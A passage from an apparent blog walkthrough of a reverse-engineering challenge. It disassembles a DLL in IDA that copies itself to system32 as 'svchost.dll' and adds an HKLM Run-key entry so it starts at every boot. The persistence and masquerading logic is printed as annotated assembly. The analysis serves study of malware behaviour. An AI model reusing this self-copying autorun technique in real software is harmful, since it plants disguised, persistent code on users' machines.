</span><span class="line">SOFTWARE\Microsoft\Windows\CurrentVersion\Run
</span><span class="line">svchost
</span><span class="line">c:\windows\system32\svchost.dll
</span><span class="line">c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>While doing the challenge only the first and last two lines were interesting to me.</p>

<ul>
  <li>It references <code>c:\windows\system32\svchost.dll</code> and <code>svchost.log</code> but there is no such file (Windows has <code>svchost.exe</code> in that location).</li>
  <li>There is also <code>c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll</code> which means this file is most probably a DLL and should be executed like that. There are no parameters, so whatever this DLL is doing should be in <code>DllMain</code>.</li>
</ul>

<p><strong>By this time you probably know what this file is supposed to do (also look at the registry key). However, at that time I did not make the connection :(</strong></p>

<p>Let’s drop this into <code>IDA</code> and jump into DllMain. I used IDA Pro but both IDA free and trial and Immunity Debugger work for this challenge (and also <a href="#ch7">challenge 7</a>). Put a breakpoint at the start of this function (<code>F2</code> key).</p>

<p><img src="http://parsiya.net/images/2014/flare/5-1.jpg" alt="DLL Entry Point" title="DLL Entry Point" /></p>

<p>If we attempt to execute the tile. IDA will complain. It’s a DLL and cannot be run by itself. But we already know how to run it thanks to the strings inside the binary. In IDA first select <code>Local Win32 Debugger</code> then go to <code>Debugger</code> menu and select <code>Process Options</code>. In the <code>Application</code> textbox enter <code>c:\windows\system32\rundll32.exe</code>. In <code>Parameters</code> enter the path to the DLL. Don’t forget to rename the file, add dll extension and include double-quotes around the path if it contains spaces (e.g. <code>"c:\Flare Challenges\Ch5\5get_it.dll",0</code>). It didn’t work without the dll extension for me.</p>

<p>Let’s start debugging. We observe standard stuff until we reach <code>.text:1000A6BB call    sub_1000A570</code>.</p>

<p><img src="http://parsiya.net/images/2014/flare/5-2.jpg" alt="sub 1000A570" title="sub 1000A570" /></p>

<p>Inside the function we encounter <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724897%28v=vs.85%29.aspx">RegOpenKeyEx</a> that opens a registry key. Full registry key is a combination of <code>hKey</code> and <code>lpSubKey</code>. <code>hKey</code> can be one of the <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724836%28v=vs.85%29.aspx">predefined keys</a>. The constants for the predefined keys needed a bit of googling because the MSDN page didn’t list them. Here they are:</p>

<table>
  <thead>
    <tr>
      <th>Key</th>
      <th style="text-align: center">Constant</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>HKEY_CLASSES_ROOT</td>
      <td style="text-align: center">0</td>
    </tr>
    <tr>
      <td>HKEY_CURRENT_USER</td>
      <td style="text-align: center">1</td>
    </tr>
    <tr>
      <td>HKEY_LOCAL_MACHINE</td>
      <td style="text-align: center">2</td>
    </tr>
    <tr>
      <td>HKEY_USERS</td>
      <td style="text-align: center">3</td>
    </tr>
    <tr>
      <td>HKEY_CURRENT_CONFIG</td>
      <td style="text-align: center">5</td>
    </tr>
  </tbody>
</table>

<p>The binary is pushing <code>0x02</code> for <code>hKey</code> and <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code> for <code>lpSubKey</code> which will result in the full path <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>. If function succeeds it will return <code>ERROR_SUCCESS</code> which is 0 according to <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382%28v=vs.85%29.aspx">this page</a>, otherwise it will return another error code.</p>

<p><img src="http://parsiya.net/images/2014/flare/5-3.jpg" alt="Registry Key" title="Registry Key" /></p>

<p>The binary will check if it has access to registry at that path. If so then the return value (in eax) will be 0 and it will jump right (JZ will succeed).<br />
<a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724911%28v=vs.85%29.aspx">RegQueryValueEx</a> checks if there is a registry key at an open path. It is looking for a registry key named <code>svchost</code> at that path. If such key exists, function will return 0. In this case, it returned 2 which stands for <code>ERROR_FILE_NOT_FOUND</code> meaning there was no such key. Then it will call <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724837%28v=vs.85%29.aspx">RegCloseKey</a> and closes the open registry path. This function’s return value is saved in <code>var_110</code> (we will need it later):</p>

<table>
  <thead>
    <tr>
      <th>Condition</th>
      <th style="text-align: center">Return Value</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Registry key cannot be opened</td>
      <td style="text-align: center">1</td>
    </tr>
    <tr>
      <td>Registry key does not exist</td>
      <td style="text-align: center">2</td>
    </tr>
    <tr>
      <td>Registry key exists</td>
      <td style="text-align: center">1000A6BB or DllMain(x,x,x)+3B</td>
    </tr>
  </tbody>
</table>

<p>After that function, we see that it is calling <code>GetModuleHandleEx</code> for <code>sub_1000A610</code> in lines 3-8 and checks the return value in line 9. The return value for <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms683200%28v=vs.85%29.aspx">GetModuleHandleEx</a> will be non-zero, otherwise it will be zero. If call was not successful then last error will be printed to file.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Returning from sub_1000A570</span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6BB</span> <span class="nv">call</span>    <span class="nv">sub_1000A570</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6C0</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_110</span><span class="p">],</span> <span class="nb">eax</span>              <span class="c1">; return value stored in var_110</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6C6</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">phModule</span><span class="p">],</span> <span class="mi">0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6D0</span> <span class="nv">lea</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">phModule</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6D6</span> <span class="nv">push</span>    <span class="nb">ecx</span>                             <span class="c1">; phModule</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6D7</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">sub_1000A610</span>             <span class="c1">; lpModuleName</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6DC</span> <span class="nv">push</span>    <span class="mi">6</span>                               <span class="c1">; dwFlags</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6DE</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">GetModuleHandleExA</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6E4</span> <span class="nv">test</span>    <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6E6</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_1000A711</span>              <span class="c1">; if (eax!=0) jmp loc_1000A711</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6E8</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">GetLastError</span>                 <span class="c1">; if (eax==0) print LastError to file</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6EE</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_120</span><span class="p">],</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6F4</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_120</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6FA</span> <span class="nv">push</span>    <span class="nb">edx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A6FB</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aGetmodulehandl</span>          <span class="c1">; &quot;GetModuleHandle returned %d\n&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A700</span> <span class="nv">call</span>    <span class="nv">sub_1000AD77</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A705</span> <span class="nv">add</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mh">40h</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A708</span> <span class="nv">push</span>    <span class="nb">eax</span>                             <span class="c1">; FILE *</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A709</span> <span class="nv">call</span>    <span class="nv">_fprintf</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A70E</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>If <code>GetModuleHandleEx</code> was successful it will land here. <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms683197%28v=vs.85%29.aspx">GetModuleFileName</a> is called which will return the full path for the specified module in <code>hModule</code>. In this case, the binary retrieves its own path (line 9) and saves it in <code>[ebp+Filename]</code>. In line 10, return value of <code>sub_1000A570</code> is compared with 2.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Getting Dll path </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A711</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A711</span> <span class="nv">loc_1000A711</span><span class="p">:</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A711</span> <span class="nv">push</span>    <span class="mh">100h</span>            <span class="c1">; nSize</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A716</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Filename</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A71C</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; lpFilename</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A71D</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">phModule</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A723</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; hModule</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A724</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">GetModuleFileNameA</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A72A</span> <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_110</span><span class="p">],</span> <span class="mi">2</span>           <span class="c1">; comparing return value of sub_1000A570 with 2</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A731</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_1000A772</span>         <span class="c1">; if return value is not 2, then jump to loc_1000A772</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>If registry key did not exist, we will continue.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>CopyFile </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A733</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">lpNewFileName</span><span class="p">],</span> <span class="nv">offset</span> <span class="nv">aCWindowsSystem</span> <span class="c1">; &quot;c:\\windows\\system32\\svchost.dll&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A73D</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_124</span><span class="p">],</span> <span class="nv">offset</span> <span class="nv">aCWindowsSyst_0</span> <span class="c1">; &quot;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A747</span> <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; bFailIfExists - 0 means overwrite if file already exists</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A749</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">lpNewFileName</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A74F</span> <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; lpNewFileName ; &quot;c:\\windows\\system32\\svchost.dll&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A750</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Filename</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A756</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; lpExistingFileName - Dll name from GetModuleFileName</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A757</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">CopyFileA</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A75D</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_124</span><span class="p">]</span>   <span class="c1">; From line 2</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A763</span> <span class="nv">push</span>    <span class="nb">ecx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A764</span> <span class="nv">call</span>    <span class="nv">sub_1000A610</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A769</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A76C</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_114</span><span class="p">],</span> <span class="nb">eax</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>We have already seen the strings being loaded in lines 1 and 2. Then <code>CopyFile</code> is called to copy itself to <code>c:\\windows\\system32\\svchost.dll</code>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>sub_1000A610 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A610</span> <span class="nv">push</span>    <span class="nb">ebp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A611</span> <span class="nv">mov</span>     <span class="nb">ebp</span><span class="p">,</span> <span class="nb">esp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A613</span> <span class="nv">sub</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mh">0Ch</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A616</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">phkResult</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A619</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; phkResult</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A61A</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aSoftwareMicr_0</span> <span class="c1">; &quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A61F</span> <span class="nv">push</span>    <span class="mh">80000002h</span>       <span class="c1">; hKey   &quot;HKEY_LOCAL_MACHINE&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A624</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">RegCreateKeyA</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A62A</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_C</span><span class="p">],</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A62D</span> <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_C</span><span class="p">],</span> <span class="mi">0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A631</span> <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_1000A663</span>
</span><span class="line">
</span><span class="line"><span class="c1">; Continue if RegCreateKey was successful</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A633</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">lpData</span><span class="p">]</span>  <span class="c1">; &quot;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A636</span> <span class="nv">push</span>    <span class="nb">ecx</span>             <span class="c1">; char *</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A637</span> <span class="nv">call</span>    <span class="nv">_strlen</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A63C</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A63F</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; cbData - strlen(lpData)</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A640</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">lpData</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A643</span> <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; lpData - ; &quot;c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A644</span> <span class="nv">push</span>    <span class="mi">1</span>               <span class="c1">; dwType</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A646</span> <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; Reserved</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A648</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aSvchost_0</span> <span class="c1">; &quot;svchost&quot;</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A64D</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">phkResult</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A650</span> <span class="nv">push</span>    <span class="nb">eax</span>             <span class="c1">; hKey</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A651</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">RegSetValueExA</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A657</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">],</span> <span class="mi">0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A65E</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A661</span> <span class="nv">jmp</span>     <span class="nv">short</span> <span class="nv">loc_1000A673</span>
</span><span class="line">
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A673</span> <span class="nv">loc_1000A673</span><span class="p">:</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A673</span> <span class="nv">mov</span>     <span class="nb">esp</span><span class="p">,</span> <span class="nb">ebp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A675</span> <span class="nv">pop</span>     <span class="nb">ebp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A676</span> <span class="nv">retn</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Line 9 pushes <code>c:\windows\system32\rundll32.exe c:\windows\system32\svchost.dll</code> to the stack and calls <code>sub_1000A610</code> in line 10. Based on this string and checking for existence of the registry key we can guess what is going to happen in this function.</p>

<p>Inside this function we see that <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms724842%28v=vs.85%29.aspx">RegCreateKey</a> to open <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>. If the key does not exist, it will create it.</p>

<p>If call was successful, execution continues to line 14. It is adding a new registry key named <code>svchost</code> to that path with the specified value. Then function will return with the result value of RegSetValueEx. If it was successful, it will be 0.</p>

<p><em>The Dll copied itself to system32 and it will run every time Windows starts</em>.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Returning from sub_1000A610 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A757</span> <span class="nv">call</span>    <span class="nb">ds</span><span class="p">:</span><span class="nv">CopyFileA</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A75D</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_124</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A763</span> <span class="nv">push</span>    <span class="nb">ecx</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A764</span> <span class="nv">call</span>    <span class="nv">sub_1000A610</span>     <span class="c1">; Create registry key</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A769</span> <span class="nv">add</span>     <span class="nb">esp</span><span class="p">,</span> <span class="mi">4</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A76C</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_114</span><span class="p">],</span> <span class="nb">eax</span>   <span class="c1">; Not used anymore</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A772</span> <span class="nv">loc_1000A772</span><span class="p">:</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A772</span> <span class="nv">call</span>    <span class="nv">sub_1000A4C0</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A777</span> <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_118</span><span class="p">],</span> <span class="nb">eax</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A77D</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_118</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A783</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">var_4</span><span class="p">]</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A786</span> <span class="nv">xor</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A788</span> <span class="nv">call</span>    <span class="err">@</span><span class="nv">__security_check_cookie@4</span> <span class="c1">; __security_check_cookie(x)</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A78D</span> <span class="nv">mov</span>     <span class="nb">esp</span><span class="p">,</span> <span class="nb">ebp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A78F</span> <span class="nv">pop</span>     <span class="nb">ebp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A790</span> <span class="nv">retn</span>    <span class="mh">0Ch</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A790</span> <span class="nv">_DllMain@12</span> <span class="nv">endp</span>
</span><span class="line"><span class="nl">.text:</span><span class="err">1000</span><span class="nf">A790</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>After we return from <code>sub_1000A610</code>, we land in line 5. Return value will be saved in <code>var_114</code> (0 is key was created). If we highlight this variable and press <code>x</code> in IDA to get external references (meaning where else this variable is being referenced and manipulated. It is not referenced anymore so we do not care about it. In line 8, a new function is called <code>sub_1000A4C0</code>. Let’s go inside.</p>

<p><img src="http://parsiya.net/images/2014/flare/5-4.jpg" alt="1000A4C0" title="1000A4C0" /></p>

<p>Inside <code>sub_1000A4C0</code> we can see that the jump to return is never taken. Because eax is set to 1 and then checked for being zero and if zero the function will return. So let’s look at the other branch.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>sub_1000A4C0 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
